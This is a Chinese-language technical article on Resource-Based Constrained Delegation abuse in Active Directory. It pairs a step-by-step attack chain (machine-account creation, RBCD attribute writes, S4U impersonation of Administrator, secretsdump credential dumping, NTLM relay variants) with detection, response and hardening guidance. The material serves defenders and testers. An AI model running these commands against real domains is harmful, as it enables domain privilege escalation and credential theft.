---
title: "资源基础约束委派(RBCD)利用与检测分析"
weight: 35
---

# 资源基础约束委派(RBCD)利用与检测分析

在 Active Directory 实战中，`Resource-Based Constrained Delegation`，即 `RBCD`，属于极高价值的后渗透权限提升路径。它不依赖传统的本地提权漏洞，而是直接利用 Kerberos 委派设计与目录对象控制权之间的关系。只要攻击者能够控制一个可用于服务认证的主体，并对目标计算机对象具备写权限，就可以代表任意用户向目标服务申请票据，最终获得目标主机上的高权限访问能力。

相较于单纯的本地管理员提权，`RBCD` 的实战价值更高：它可以稳定融入域内横向移动链路，可与 `NTLM Relay`、`AD CS`、对象 ACL 滥用等手法组合，并且在多数环境中留下的是目录修改和 Kerberos 服务票据痕迹，而不是典型的恶意可执行文件落地行为。

---

## 1. 原理与攻击前提

### 1.1 RBCD 的控制点

传统约束委派通过前端服务对象的 `msDS-AllowedToDelegateTo` 控制“它可以代理到哪里”；而 `RBCD` 则反过来，由目标资源对象通过 `msDS-AllowedToActOnBehalfOfOtherIdentity` 决定“它信任谁代表别人来访问自己”。

对红队而言，关键不是先拿下域管，而是满足两个前提：

1. 控制一个可以参与 Kerberos 服务票据流程的主体。
常见做法是创建新的机器账户，因为机器账户天然带有 `HOST/`、`CIFS/` 等 `SPN`，可以参与 `S4U2Self` 和 `S4U2Proxy` 票据流程。

2. 对目标计算机对象具备写能力。
典型权限包括 `GenericAll`、`GenericWrite`、`WriteProperty`、`WriteDacl`，本质上是允许修改目标对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`。

### 1.2 为什么普通域用户也可能够用

很多域默认保留 `MachineAccountQuota=10`，这意味着普通域用户通常可以自行向域中创建最多 10 台机器账户。这样一来，攻击者即使没有预先控制服务账户，也能先造一个自己完全可控的机器主体，再把它写入目标对象的 `RBCD` 属性中。

### 1.3 票据层面的本质

完成属性写入后，攻击者使用受控主体发起：

- `S4U2Self`：代表指定用户向自己申请服务票据
- `S4U2Proxy`：再把这个能力转换成对目标服务的访问票据

最终结果不是拿到目标用户明文密码，而是拿到“以该用户身份访问目标服务”的 `TGS`。对实战来说，这已经足够用于 `CIFS`、`HOST`、`HTTP`、`LDAP` 等常见服务的高权限操作。

---

## 2. 红队标准攻击链

下面给出最常见、最稳定的一条 `RBCD` 利用链。该链路公开资料、实战培训与渗透测试中都极为常见，核心工具以 `Impacket`、`PowerMad`、`PowerView`、`Rubeus` 为主。

### 2.1 枚举可写目标

Windows 环境常见做法是先枚举对哪些计算机对象存在写权限：

```powershell
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|GenericAll"
  } |
  Select-Object ObjectDN, SecurityIdentifier, ActiveDirectoryRights
```

如果使用 BloodHound，重点关注：

- 当前用户或其所属组是否对某个计算机对象存在 `GenericWrite` / `GenericAll`
- 当前用户是否具备 `AddComputer` 能力
- 目标是否处于高价值节点路径中，例如文件服务器、跳板机、管理节点或域控

### 2.2 创建可控机器账户

如果当前没有可控服务主体，最常见的做法是利用 `MachineAccountQuota` 创建一个机器账户。

Linux/Impacket：

```bash
addcomputer.py 'corp.local/lowpriv:Password123!' \
  -dc-ip 10.10.10.10 \
  -computer-name 'RBCD-SVC$' \
  -computer-pass 'Str0ngPass!123'
```

Windows/PowerMad：

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount "RBCD-SVC" `
  -Password $(ConvertTo-SecureString 'Str0ngPass!123' -AsPlainText -Force)
```

创建完成后，需要记下机器账户的名称、SID 与密码。后续属性写入和票据申请都依赖这个主体。

### 2.3 写入 RBCD 属性

Linux/Impacket 直接修改目标主机对象上的 `msDS-AllowedToActOnBehalfOfOtherIdentity`：

```bash
rbcd.py \
  -delegate-from 'RBCD-SVC$' \
  -delegate-to 'FILE01$' \
  -action write \
  -dc-ip 10.10.10.10 \
  'corp.local/lowpriv:Password123!'
```

如果成功，表示目标主机 `FILE01$` 已信任 `RBCD-SVC$` 代表任意用户访问它。

Windows 环境也可通过 PowerView 或 AD 模块进行等效操作，例如：

```powershell
Set-DomainRBCD -Identity FILE01 -DelegateFrom 'RBCD-SVC$'
```

### 2.4 申请代表高权限用户的服务票据

完成写入后，使用自己刚创建的机器账户申请针对目标服务的服务票据。最常见的目标服务为 `cifs/目标主机`，因为它可直接用于远程文件访问、`psexec`、凭据导出等操作。

```bash
getST.py \
  -spn cifs/file01.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 \
  'corp.local/RBCD-SVC$:Str0ngPass!123'
```

成功后会得到类似 `Administrator.ccache` 的 Kerberos 缓存文件。

### 2.5 使用票据横向访问目标

将缓存文件导出到环境变量后，可直接驱动一系列基于 Kerberos 的工具：

```bash
export KRB5CCNAME=Administrator.ccache

secretsdump.py -k -no-pass \
  corp.local/administrator@file01.corp.local \
  -dc-ip 10.10.10.10
```

如果目标是普通成员服务器，常见操作包括：

- 访问 `C$` 共享
- 通过 `psexec.py -k -no-pass` 远程执行
- 转储本地 `SAM/LSA Secrets`

如果目标是域控或具备目录访问能力的高价值主机，则后续可进一步进入：

- `DCSync`
- 证书服务滥用
- GPO 或登录脚本投毒
- 面向管理平面的二次横向移动

---

## 3. 组合攻击：NTLM Relay 到 RBCD

`RBCD` 最大的实战价值之一，是它并不一定要求攻击者原本就拥有目标对象的显式写权限。在部分链路里，攻击者可以通过中继高权限机器或服务账户的身份，直接替目标对象写入 `RBCD` 属性。

### 3.1 典型链路

公开案例中最常见的组合链路如下：

1. 攻击者先创建一台可控机器账户
2. 诱导或强制高权限机器发起 NTLM 认证
3. 使用 `ntlmrelayx` 将该认证中继到 LDAP
4. 利用 LDAP 写操作为目标对象配置 `RBCD`
5. 再使用 `getST.py` 对目标申请 `S4U` 票据

这类手法常见于：

- `PetitPotam`
- `PrinterBug`
- `WebClient/WebDAV` 触发认证
- 利用机器账户自身认证被中继的场景

### 3.2 攻击意义

这类链路的危险点在于，它把“对象写权限”从一个静态的 ACL 问题，转化成了“是否能把某个机器或服务的身份中继到 LDAP”。因此在一些原本看起来没有明显对象控制关系的环境中，攻击者依旧可能通过认证强制和中继完成 `RBCD` 配置。

### 3.3 实战注意点

- 目标域控版本至少需要支持 `RBCD` 相关机制
- `LDAP Signing`、`EPA`、`SMB Signing` 等加固项会直接影响中继可行性
- 如果环境中 `MachineAccountQuota=0`，标准“新建机器账户”思路会受阻，但仍可能存在已有可控机器账户或 `SPN` 账户可被利用
- `Protected Users` 或标记为“Account is sensitive and cannot be delegated”的账户通常不适合作为被模拟身份，但内置 RID 500 `Administrator` 在一些场景下仍是高风险对象

---

## 4. 攻击中的关键细节与变体

### 4.1 不要只盯着域控

很多防守方只把 `RBCD` 与域控接管绑定，实际上成员服务器、备份服务器、跳板机、证书服务器、运维平台同样值得优先利用。因为这些主机一旦被拿下，往往能够为下一跳提供：

- 高权限凭据缓存
- 运维管理接口
- 与域控等高价值目标的信任链

### 4.2 SPN 不是唯一思路

近年来公开研究已经证明，某些场景下可以利用 `SPN-less RBCD` 变体，通过 `U2U` 等方式绕开“必须有 SPN 的主体”这一传统理解。不过这类手法对环境要求更高，且常伴随对目标账户正常使用造成影响。在一般渗透测试中，更稳定的路径仍是“创建机器账户或控制已有机器账户”。

### 4.3 RBCD 与 AD CS 的联动

如果环境中还存在 `AD CS` 配置问题，则可形成更完整的攻击链：

- 先通过 `ESC8` 或其他证书链路拿到机器证书
- 使用证书进入 `LDAP Shell`
- 直接设置 `RBCD`
- 再获取目标主机的高权限服务票据

这意味着 `RBCD` 不应被当成一个孤立漏洞点，而应被视为域内后渗透“身份转换枢纽”。

---

## 5. 蓝队检测与痕迹分析

`RBCD` 的优点是非常强，缺点是只要开启了正确的审计，关键动作其实并不隐形。排查时不要只看一条日志，而要把“对象修改”与“Kerberos 票据申请”串成时间线。

### 5.1 Event ID 5136：目录对象被修改

最关键的检测点是域控上的 `5136`。如果启用了目录服务修改审计，可以看到目标对象属性被改写。

重点关注：

- 被修改属性是否为 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- 修改者是否为低权限用户、异常服务账户、机器账户
- 被修改对象是否为高价值计算机对象，例如文件服务器、管理主机、域控

简化排查思路：

```powershell
Get-WinEvent -LogName Security |
  Where-Object {
    $_.Id -eq 5136 -and
    $_.Message -like "*msDS-AllowedToActOnBehalfOfOtherIdentity*"
  }
```

如果在短时间内先看到 `5136`，随后又出现与同一主机相关的异常 `4769`，命中率会很高。

### 5.2 Event ID 4741：新机器账户创建

如果攻击者使用了 `MachineAccountQuota` 路径，域控上通常会出现 `4741`。

重点关注：

- 创建机器账户的操作者是否为普通用户
- 新机器账户名称是否可疑，例如随机字符串、测试风格命名、与资产台账不一致
- 新机器账户是否在创建后很短时间内就参与 Kerberos 委派票据流程

单独看 `4741` 噪音可能偏大，但一旦它与 `5136`、`4769` 形成链路，就非常有价值。

### 5.3 Event ID 4769：Kerberos 服务票据请求

`RBCD` 成功利用的核心痕迹在 `4769`。蓝队应重点识别两个阶段：

1. `S4U2Self`
2. `S4U2Proxy`

调查要点如下：

- 账户名与服务名高度相似或相同，常见于 `S4U2Self`
- `Transited Services` 字段非空，常见于 `S4U2Proxy`
- 同一时间窗口内连续出现两条相关 `4769`
- 票据请求主体是新建机器账户或平时不做委派的主机
- 访问的 `SPN` 指向高价值主机，例如 `cifs/dc01`、`host/fileserver`、`ldap/dc01`

在公开检测思路中，一个高价值关联方式是：

- `4741` 找到新机器账户
- `5136` 找到其 SID 被写入目标对象
- `4769` 看到该机器账户对自己做 `S4U2Self`
- 随后对目标服务做 `S4U2Proxy`

这一整条链非常接近真实利用过程。

### 5.4 目标主机侧访问痕迹

拿到票据后，攻击者通常会在目标主机上留下二次访问痕迹，例如：

- `4624` 网络登录
- `5140` 共享访问
- `7045` 新服务安装
- `Sysmon Event ID 1` 远程命令执行或落地工具启动

如果蓝队已经确认某个高权限 `4769` 可疑，应立即向目标主机横向扩展分析：

- 是否紧接着出现来自异常来源的 Kerberos 登录
- 是否存在 `SMB`、`WMI`、`PsExec`、`WinRM` 对应行为
- 是否出现凭据导出、服务创建、计划任务下发

---

## 6. 调查与处置流程

一旦确认 `RBCD` 被滥用，不应只删一个属性就结束，因为攻击者往往已经利用票据进入目标主机。

### 6.1 第一阶段：阻断利用链

立即执行：

- 清理目标对象上的 `msDS-AllowedToActOnBehalfOfOtherIdentity`
- 禁用或删除攻击者新建的机器账户
- 回收可能被攻击者控制的服务账户或机器账户凭据

如果怀疑机器账户已被用于长期驻留，应重置对应机器账户密码或重新入域。

### 6.2 第二阶段：扩展排查

围绕以下对象做时间线关联：

- 修改属性的操作者
- 被创建的机器账户
- 被设置 `RBCD` 的目标主机
- 被模拟的高权限用户

同时重点检查：

- 是否已经发生 `secretsdump`、`DCSync`
- 是否有新证书申请、GPO 修改、登录脚本变更
- 是否存在后续票据伪造或其他委派链路滥用

### 6.3 第三阶段：长期加固

降低此类问题复发概率的措施包括：

- 将 `MachineAccountQuota` 调整为 `0`
- 清理非必要对象 ACL，避免普通用户或业务组对计算机对象具有写权限
- 对高价值账户启用“敏感且不能被委派”
- 强化 `LDAP Signing`、`SMB Signing` 与中继相关安全配置
- 为 `5136` 中涉及关键委派属性的修改建立实时告警
- 对 `4769` 中 `S4U2Self` / `S4U2Proxy` 特征建立规则化关联检测

---

## 7. 实战判断标准

在真实渗透或攻防演练中，可以把下面这些问题作为 `RBCD` 的快速判断清单：

- 当前身份能否创建机器账户
- 当前身份或其所属组是否对某台主机对象存在写权限
- 是否存在可以被模拟的高权限目标用户
- 目标环境是否允许使用 Kerberos 票据直接访问 `CIFS`、`HOST`、`LDAP`
- 是否能通过 `NTLM Relay` 间接拿到对象写入能力

如果其中两到三个条件同时成立，`RBCD` 往往就已经是优先级很高的突破路径。

---

## 8. 总结

`RBCD` 之所以在域渗透中长期保持高热度，不是因为它新，而是因为它兼具三个特点：

- 对攻击者来说，利用门槛低，公开工具成熟
- 对环境来说，常与默认配置和对象权限疏忽共存
- 对防守方来说，如果不做目录修改与 Kerberos 行为关联，就很容易漏报

从红队视角看，`RBCD` 是把“对象控制权”直接转化成“身份代理能力”的高效手段；从蓝队视角看，真正关键的不是知道这个名词，而是能否把 `4741`、`5136`、`4769` 和目标主机访问事件拼成一条完整攻击链。

---

## 参考资料

- [The Hacker Recipes: RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [Altered Security: Abusing Resource-Based Constrained Delegation using Linux](https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd)
- [PentestLab: Resource Based Constrained Delegation](https://pentestlab.blog/2021/10/18/resource-based-constrained-delegation/)
- [Raxis: AD Series - Resource Based Constrained Delegation](https://raxis.com/blog/ad-series-resource-based-constrained-delegation-rbcd/)
- [iRed.Team: Kerberos Resource-based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [swolfsec: Detecting Resource-Based Constrained Delegation Abuse](https://swolfsec.github.io/2023-11-29-Detecting-Resource-Based-Constrained-Delegation/)
- [Crowe: Constrained Delegation and Resource-Based Delegation](https://www.crowe.com/insights/crowe-cyber-watch/constrained-delegation-resource-based-delegation-outsmart-attacks)
